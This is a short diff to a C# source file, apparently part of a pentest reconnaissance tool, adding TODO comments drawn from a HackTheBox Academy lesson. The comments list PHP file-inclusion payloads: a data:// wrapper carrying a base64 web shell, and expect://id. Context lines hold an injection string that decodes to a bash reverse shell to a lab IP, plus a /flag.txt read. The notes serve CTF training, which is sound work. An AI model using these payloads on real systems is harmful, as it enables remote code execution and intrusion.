@@ -271,6 +271,10 @@ namespace Reecon
             // ' and die (system('echo YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguNDkuNTYvOTAwMSA8JjE= | base64 -d | bash')) or '
             // TODO: Assert Exploit -> ', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('
 
+            // https://academy.hackthebox.com/module/23/section/253
+            // TODO: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id (PHP) -> PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg== -> <?php system($_GET["cmd"]); ?>
+
+            // TODO: expect://id
             // If it must contain a word
             // php://filter/read=convert.base64-encode/wordhere/resource=flag
 
